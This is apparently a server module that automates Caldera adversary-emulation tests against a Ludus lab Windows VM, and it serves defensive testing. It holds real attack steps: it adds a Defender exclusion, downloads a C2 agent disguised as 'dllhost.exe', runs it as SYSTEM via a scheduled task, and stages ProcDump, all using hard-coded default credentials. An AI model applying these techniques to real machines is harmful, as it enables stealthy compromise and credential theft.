import { $ } from "bun"

const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

const VM_DEFS = {
  "router":       { vm_name: "{{ range_id }}-router-debian11-x64", linux: true },
  "attacker-kali": { vm_name: "{{ range_id }}-attacker-kali", linux: true },
  "win11-22h2":   { vm_name: "{{ range_id }}-win11-22h2", linux: false },
}

function sendStatus(ws, step, status, message) {
  console.log(`[server] sendStatus step=${step} status=${status} "${message}"`)
  ws.send(JSON.stringify({ type: "testAbilityStatus", step, status, message }))
}

async function apiCall(ludusUrl, apiKey, path) {
  console.log(`[server] Ludus API call: GET ${ludusUrl}${path}`)
  const res = await fetch(`${ludusUrl}${path}`, {
    headers: { "Content-Type": "application/json", "X-API-KEY": apiKey },
    tls: { rejectUnauthorized: false },
  })
  const data = await res.json()
  if (!res.ok) throw new Error(data.error || `Ludus API error: ${res.status}`)
  return data
}

async function calderaRest(method, body) {
  console.log(`[server] Caldera ${method} /api/rest index=${body.index}`)
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  const data = await res.json()
  if (!res.ok) throw new Error(`Caldera API error (${res.status}): ${JSON.stringify(data)}`)
  return data
}

async function calderaApi(method, path, body) {
  console.log(`[server] Caldera ${method} ${path}`)
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  const data = await res.json()
  if (!res.ok) throw new Error(`Caldera API error (${res.status} on ${path}): ${JSON.stringify(data)}`)
  return data
}

async function sshRun(host, user, pass, command) {
  console.log(`[server] SSH run: ssh ${user}@${host} — ${command.slice(0, 80)}${command.length > 80 ? "..." : ""}`)
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

async function winrmRun(host, user, pass, command) {
  console.log(`[server] WinRM run: ${user}@${host} — ${command.slice(0, 80)}${command.length > 80 ? "..." : ""}`)
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

function normalizePrereq(script) {
  return script
    .replace(/\\\s*\n\s*/g, " ")
    .replace(/\n+/g, " && ")
    .trim()
}

function normalizeWinPrereq(script) {
  return script
    .replace(/\n+/g, "; ")
    .trim()
}

async function installKaliPrereq(ip, script) {
  if (!script) return
  const cmd = normalizePrereq(script)
  await sshRun(ip, "kali", "kali", cmd)
}

async function installWinPrereq(ip, script) {
  if (!script) return
  const cmd = normalizeWinPrereq(script)
  await winrmRun(ip, "localuser", "password", `powershell -Command "${cmd}"`)
}

async function getCalderaAgents() {
  console.log("[server] getCalderaAgents() — fetching agent list")
  return calderaRest("POST", { index: "agents" })
}

async function deploySandcatWindows(ip, group) {
  console.log(`[server] deploySandcatWindows(ip=${ip}, group=${group})`)

  try {
    const status = await winrmRun(ip, "localuser", "password",
      'powershell -Command "if ((Get-MpComputerStatus).RealTimeProtectionEnabled) { Write-Host ENABLED } else { Write-Host DISABLED }"')
    if (status.trim() === "ENABLED") {
      await winrmRun(ip, "localuser", "password",
        'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\Public\'"')
      console.log("[server] Defender exclusion added for C:\\Users\\Public")
    } else {
      console.log("[server] Defender real-time protection is disabled, skipping exclusion")
    }
  } catch {}

  const dlCmd = `powershell -Command "$url='http://10.1.99.1:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`
  await winrmRun(ip, "localuser", "password", dlCmd)

  const taskName = `CalderaSandcat-${group}`
  const taskCmd = `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://10.1.99.1:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`
  await winrmRun(ip, "localuser", "password", taskCmd)
  console.log(`[server] scheduled task ${taskName} started as SYSTEM`)
}

async function killAllAgents() {
  console.log("[server] killAllAgents() — removing stale agents")
  try {
    const agents = await getCalderaAgents()
    for (const a of agents) {
      try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
    }
    console.log(`[server] killAllAgents() — removed ${agents.length} agents`)
  } catch {}
}

async function killWindowsSandcat(ip) {
  console.log("[server] killWindowsSandcat() — stopping dllhost processes on Windows")
  try {
    await winrmRun(ip, "localuser", "password",
      'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'DONE\'"')
  } catch {}
  console.log("[server] killWindowsSandcat() — cleaning up stale scheduled tasks")
  try {
    await winrmRun(ip, "localuser", "password",
      'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
  } catch {}
}

async function waitForCaldera(timeoutMs = 120000) {
  console.log(`[server] waitForCaldera(timeoutMs=${timeoutMs})`)
  const start = Date.now()
  while (Date.now() - start < timeoutMs) {
    try {
      await calderaRest("POST", { index: "agents" })
      console.log("[server] Caldera API is ready")
      return
    } catch {}
    await new Promise(r => setTimeout(r, 1000))
  }
  throw new Error(`Caldera did not become ready within ${timeoutMs}ms`)
}

async function waitForAgent(group, timeoutMs = 60000) {
  console.log(`[server] waitForAgent(group=${group}, timeoutMs=${timeoutMs})`)
  const start = Date.now()
  while (Date.now() - start < timeoutMs) {
    const agents = await getCalderaAgents()
    const agent = agents.find(a => a.group === group)
    if (agent) {
      console.log(`[server] agent found: paw=${agent.paw} group=${agent.group} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)}`)
      if (!agent.trusted) throw new Error(`Agent ${agent.paw} is not trusted — planner will silently skip it, chain will be empty`)
      return agent
    }
    await new Promise(r => setTimeout(r, 3000))
  }
  throw new Error(`Agent with group "${group}" did not check in within ${timeoutMs}ms`)
}

async function deployAbilityPayload(ip, ability) {
  const match = ability.executors[0].command.match(/ExternalPayloads\\([^\s"]+)/)
  if (!match) return null
  const filename = match[1]
  const destPath = `C:\\Users\\Public\\${filename}`

  try {
    await winrmRun(ip, "localuser", "password",
      `powershell -Command "if (Test-Path '${destPath}') { Write-Host 'EXISTS' } else { Write-Host 'MISSING' }"`)
  } catch { return destPath }

  const PAYLOAD_URLS = {
    "procdump.exe": "https://download.sysinternals.com/files/Procdump.zip",
    "procdump64.exe": "https://download.sysinternals.com/files/Procdump.zip",
  }
  const url = PAYLOAD_URLS[filename]
  if (!url) return null

  console.log(`[server] deployAbilityPayload: downloading ${filename} from ${url}`)
  await winrmRun(ip, "localuser", "password",
    `powershell -Command "Invoke-WebRequest -Uri '${url}' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\${filename}' '${destPath}' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force; Write-Host 'DEPLOYED'"`)
  console.log(`[server] deployAbilityPayload: ${filename} deployed to ${destPath}`)

  if (filename.includes("procdump")) {
    await winrmRun(ip, "localuser", "password",
      `reg add "HKU\\S-1-5-18\\Software\\Sysinternals\\ProcDump" /v EulaAccepted /t REG_DWORD /d 1 /f`)
    console.log(`[server] deployAbilityPayload: EULA pre-accepted for SYSTEM`)
  }

  return destPath
}

async function exploitAbility(paw, ability, payloadPath) {
  const abilityId = ability.ability_id
  console.log(`[server] exploitAbility(paw=${paw}, abilityId=${abilityId})`)

  const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
  const cmdField = "executors.0.command"

  const modified = structuredClone(original)
  const oldCmd = modified.executors[0].command
  modified.executors[0].command = oldCmd.replace(
    /"PathToAtomicsFolder[^"]*"/,
    `"${payloadPath}"`
  )
  console.log(`[server] exploitAbility: command "${oldCmd.slice(0, 60)}..." → "${modified.executors[0].command.slice(0, 60)}..."`)

  await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)

  try {
    console.log(`[server] exploitAbility: POST /plugin/access/exploit`)
    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`[server] exploitAbility: exploit result=${JSON.stringify(exploitResult)}`)

    const start = Date.now()
    while (Date.now() - start < 120000) {
      const agents = await getCalderaAgents()
      const agent = agents.find(a => a.paw === paw)
      if (!agent) throw new Error("Agent disappeared")
      const links = agent.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        const facts = mine.facts || []
        console.log(`[server] exploitAbility: link id=${mine.id} status=${mine.status} facts=${facts.length}`)
        return { facts, status: mine.status, linkId: mine.id }
      }
      await new Promise(r => setTimeout(r, 2000))
    }
    throw new Error("Link did not appear within 120s")
  } finally {
    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, original)
    console.log(`[server] exploitAbility: command restored`)
  }
}

export async function testAbility(ludusUrl, apiKey, data, ws) {
  console.log(`[server] testAbility() entry — data:`, JSON.stringify(data.data))
  let group = null
  let winVm = null
  let originalAbility = null

  try {
    const { abilityId, name, kaliPrereq, winPrereq } = data.data || {}
    if (!abilityId) {
      sendStatus(ws, "complete", "error", "No ability selected for testing")
      return
    }

    sendStatus(ws, "powerCheck", "running", "Cleaning up previous agents...")
    await killAllAgents()

    sendStatus(ws, "powerCheck", "running", "Checking VM power status...")

    const range = await apiCall(ludusUrl, apiKey, "/range")
    const vms = range.VMs ?? []
    const rangeId = process.env.LUDUS_RANGE_ID || "ty"

    const defs = Object.entries(VM_DEFS)
    const targets = defs.map(([key, def]) => {
      const expected = def.vm_name.replace("{{ range_id }}", rangeId).toLowerCase()
      const vm = vms.find(v => (v.name || "").toLowerCase().includes(expected))
      return { key, vm, expected, linux: def.linux }
    })

    for (const t of targets) {
      if (!t.vm) {
        sendStatus(ws, "powerCheck", "error", `${t.key} not found in range`)
        sendStatus(ws, "complete", "error", "Test failed — VM not deployed")
        return
      }
      if (!t.vm.poweredOn) {
        sendStatus(ws, "powerCheck", "error", `${t.key} (${t.vm.name}) is powered off`)
        sendStatus(ws, "complete", "error", "Test failed — VM powered off")
        return
      }
    }

    sendStatus(ws, "powerCheck", "success", "All 3 VMs are powered on")

    sendStatus(ws, "cliCheck", "running", "Testing CLI access...")

    for (const t of targets) {
      const ip = t.vm.ip
      if (!ip || ip === "null") {
        sendStatus(ws, "cliCheck", "error", `${t.key} has no IP address`)
        sendStatus(ws, "complete", "error", "Test failed — no IP")
        return
      }

      const port = t.linux ? 22 : 5986
      try {
        await $`bash -c "timeout 3 bash -c '</dev/tcp/${ip}/${port}' 2>/dev/null"`.quiet()
      } catch {
        sendStatus(ws, "cliCheck", "error", `Port ${port} on ${t.key} (${ip}) not reachable`)
        sendStatus(ws, "complete", "error", "Test failed — CLI unreachable")
        return
      }
    }

    sendStatus(ws, "cliCheck", "success", "CLI access confirmed — SSH on router and kali, WinRM on win11")

    const winTarget = targets.find(t => t.key === "win11-22h2")
    if (!winTarget || !winTarget.vm) {
      sendStatus(ws, "complete", "error", "Windows 11 VM not found in range")
      return
    }
    winVm = winTarget

    const kaliVm = targets.find(t => t.key === "attacker-kali")

    if (kaliPrereq || winPrereq) {
      sendStatus(ws, "prereqInstall", "running", "Installing prerequisites...")
      if (kaliPrereq && kaliVm?.vm?.ip) {
        await installKaliPrereq(kaliVm.vm.ip, kaliPrereq)
        sendStatus(ws, "prereqInstall", "running", "Kali prerequisites installed, waiting for Caldera...")
        await waitForCaldera()
      }
      if (winPrereq) {
        await installWinPrereq(winVm.vm.ip, winPrereq)
      }
      sendStatus(ws, "prereqInstall", "success", "Prerequisites installed")
    } else {
      sendStatus(ws, "prereqInstall", "success", "No prerequisites required")
    }

    group = `test-${Date.now()}`

    sendStatus(ws, "agentDeploy", "running", "Killing stale Windows sandcat processes...")
    await killWindowsSandcat(winVm.vm.ip)

    sendStatus(ws, "agentDeploy", "running", "Deploying sandcat agent on Windows target...")
    await deploySandcatWindows(winVm.vm.ip, group)
    sendStatus(ws, "agentDeploy", "success", "Sandcat agent deployed on Windows target")

    sendStatus(ws, "agentWait", "running", "Waiting for agent to check in to Caldera...")
    const agent = await waitForAgent(group)
    sendStatus(ws, "agentWait", "success", `Agent "${agent.paw}" checked in`)

    sendStatus(ws, "abilityLookup", "running", `Fetching ability "${name}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`[server] ability executors: platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)

    sendStatus(ws, "payloadDeploy", "running", "Deploying ability payload to Windows target...")
    const payloadPath = await deployAbilityPayload(winVm.vm.ip, ability)
    if (payloadPath) {
      sendStatus(ws, "payloadDeploy", "success", `Payload deployed to ${payloadPath}`)
    } else {
      sendStatus(ws, "payloadDeploy", "success", "No payload needed")
    }

    sendStatus(ws, "abilityExploit", "running", `Exploiting agent with ability "${name}"...`)
    const result = await exploitAbility(agent.paw, ability, payloadPath || ability.executors[0].command)
    const factsCount = result?.facts?.length || 0
    sendStatus(ws, "abilityExploit", "success", `Ability executed — ${factsCount} facts collected`)

    sendStatus(ws, "cleanup", "running", "Cleaning up agent and scheduled task...")
    try { await calderaRest("DELETE", { index: "agents", paw: agent.paw }) } catch {}
    await winrmRun(winVm.vm.ip, "localuser", "password",
      `powershell -Command "Unregister-ScheduledTask -TaskName 'CalderaSandcat-${group}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
    sendStatus(ws, "cleanup", "success", "Cleaned up agent and scheduled task")

    sendStatus(ws, "complete", "success", `Ability "${name}" tested successfully — ${factsCount} facts`)
  } catch (err) {
    console.log(`[server] testAbility caught error: ${err.message}`)
    sendStatus(ws, "complete", "error", err.message)
    try {
      if (winVm?.vm?.ip && group) {
        await winrmRun(winVm.vm.ip, "localuser", "password",
          `powershell -Command "Unregister-ScheduledTask -TaskName 'CalderaSandcat-${group}' -Confirm:\$false -ErrorAction SilentlyContinue"`)
      }
    } catch {}
  }
}
